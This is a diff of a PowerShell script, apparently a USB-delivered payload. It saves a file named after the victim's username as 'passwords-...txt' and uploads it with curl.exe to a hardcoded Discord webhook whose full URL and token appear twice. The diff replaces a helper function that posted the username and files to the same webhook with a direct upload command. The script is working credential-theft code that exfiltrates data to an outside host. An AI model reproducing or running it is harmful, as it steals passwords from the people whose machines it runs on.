@@ -1,26 +1,3 @@
-﻿function Upload-Discord {
-
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
-
-$hookurl = 'https://discord.com/api/webhooks/1103770625807495268/HPCqKHhV5TbWTpg5VibrXPYFRqMFoOmm_HAcUAVTHef8PSz0xiEKxbCX-BvimV3fK6Y1'
-
-$Body = @{
-  'username' = $env:username
-  'content' = $text
-}
-
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
-}
-
 $random = -join ((48..57) | Get-Random -Count 3 | ForEach-Object {[char]$_})
 
 mkdir C:/Payloads
@@ -35,8 +12,7 @@ Set-Location C:\payloads
 
 Start-Sleep -seconds 15
 
-
-Upload-Discord -file "passwords-$env:UserName$random.txt"
+curl.exe -F "payload_json={\`"content\`": \`"\`"}" -F "file=@passwords-$env:UserName$random.txt" https://discord.com/api/webhooks/1103770625807495268/HPCqKHhV5TbWTpg5VibrXPYFRqMFoOmm_HAcUAVTHef8PSz0xiEKxbCX-BvimV3fK6Y1
 
 Start-Sleep -seconds 1
 
